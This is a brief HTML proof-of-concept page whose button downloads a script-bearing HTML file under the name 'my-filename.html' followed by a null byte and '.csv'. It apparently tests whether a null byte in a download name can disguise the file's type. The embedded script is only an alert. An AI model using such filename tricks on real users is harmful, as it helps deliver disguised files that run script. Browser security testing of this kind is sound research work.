<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Download PoC</title>
</head>
<body>

<button onclick="run()">Download file</button>

<script>
function run() {
  const a = document.createElement('a');

  const blob = new Blob(
    ["<html><body><script>alert('hello')</script></body></html>"],
    { type: "text/html" }
  );

  a.href = URL.createObjectURL(blob);
  a.download = 'my-filename.html\u0000.csv'; // still using your null byte 😄

  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  URL.revokeObjectURL(a.href);
}
</script>

</body>
</html>
